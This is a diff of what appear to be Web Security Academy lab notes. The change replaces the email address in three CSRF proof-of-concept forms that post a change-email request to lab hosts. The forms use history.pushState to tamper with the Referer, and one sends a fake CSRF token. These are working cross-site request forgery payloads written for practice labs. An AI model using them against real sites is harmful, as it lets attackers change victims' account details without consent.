@@ -113,7 +113,7 @@ email=....&csrftoken=.....
 <body>
    <script>history.pushState(' ',' ','/')</script>
    <form action="https://0a6a006c04de5fc7829147ec00750057.web-security-academy.net/my-account/change-email" method="POST"/>
-   <input type="hidden" name="email" value="a@gmail.com"/>
+   <input type="hidden" name="email" value="user@example.com"/>
    <input type="hidden" name="csrf" value="fake"/>
    <input type="submit" value="submit request"/>
    </form>
@@ -130,7 +130,7 @@ email=....&csrftoken=.....
 <body>
    <script>history.pushState(' ', ' ' ,'/')</script>
    <form action="https://0a390078039fe0a780e435a600ca0059.web-security-academy.net/my-account/change-email" method="POST">
-   <input type="hidden" name="email" value="a@gmail.com">
+   <input type="hidden" name="email" value="user@example.com">
    <input type="submit" value="submit" >
    </form>
    <script>
@@ -146,7 +146,7 @@ email=....&csrftoken=.....
 <body>
    <script>history.pushState(' ', ' ' ,'/?0ad4003504bb812580aae57c00c40072.web-security-academy.net')</script>
    <form action="https://0ad4003504bb812580aae57c00c40072.web-security-academy.net/my-account/change-email" method="POST">
-   <input type="hidden" name="email" value="a@gmail.com">
+   <input type="hidden" name="email" value="user@example.com">
    <input type="submit" value="submit" >
    </form>
    <script>
